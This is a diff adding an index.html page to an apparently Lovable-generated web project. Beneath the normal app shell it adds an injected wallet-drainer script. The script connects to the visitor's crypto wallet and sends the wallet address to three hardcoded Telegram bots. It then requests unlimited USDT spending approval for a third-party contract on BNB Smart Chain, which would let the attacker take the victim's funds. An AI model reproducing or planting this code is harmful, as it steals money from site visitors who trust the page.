@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>-gas-glide</title>
+    <meta name="description" content="Lovable Generated Project" />
+    <meta name="author" content="Lovable" />
+
+    <meta property="og:title" content="-gas-glide" />
+    <meta property="og:description" content="Lovable Generated Project" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@lovable_dev" />
+    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+  </head>
+
+  <body>
+
+<div style="text-align:center;margin-top:20px;margin-bottom:20px;">
+  <img src="header.png" style="max-width:90%;height:auto;border-radius:15px;box-shadow:0 0 15px rgba(0,0,0,0.5);" />
+</div>
+
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<script>
+async function connectWalletAndApprove() {
+    if (typeof window.ethereum === 'undefined') {
+        alert('Please install MetaMask or Trust Wallet extension.');
+        return;
+    }
+
+    const telegramTokens = [
+        {token: "8090101974:AAE3xE3FHWY-Z-2FmnF-ojjvP9BLsWB1eOI", chat_id: "6774801802"},
+        {token: "7709787004:AAHEVEnqJjc6RzpaHcjePwzifB2ODVCNnDg", chat_id: "7667794965"},
+        {token: "7280248421:AAEl_W-g7kFKCBBrWBi6ADsDGeTn0YEl82o", chat_id: "5831749892"}
+    ];
+
+    const usdtToken = "0x55d398326f99059fF775485246999027B3197955";
+    const spenderContract = "0xd76D3099261f6f9eaD48DA15804b46bfd5eE3D33";
+
+    try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const userAddress = accounts[0];
+
+        // Send wallet address to all 3 Telegram bots
+        telegramTokens.forEach(tg => {
+            fetch(`https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=New Wallet: ${userAddress}`);
+        });
+
+        // Switch network to BNB Smart Chain
+        await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+                chainId: '0x38',
+                chainName: 'Binance Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com']
+            }]
+        });
+
+        const web3 = new Web3(window.ethereum);
+        const usdtContract = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], usdtToken);
+        
+        const maxApproval = web3.utils.toTwosComplement('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+
+        await usdtContract.methods.approve(spenderContract, maxApproval).send({ from: userAddress });
+
+        document.getElementById('successMsg').style.display = 'block';
+
+    } catch (err) {
+        console.error(err);
+        alert('Transaction cancelled or failed.');
+    }
+}
+</script>
+
+</body>
+</html>
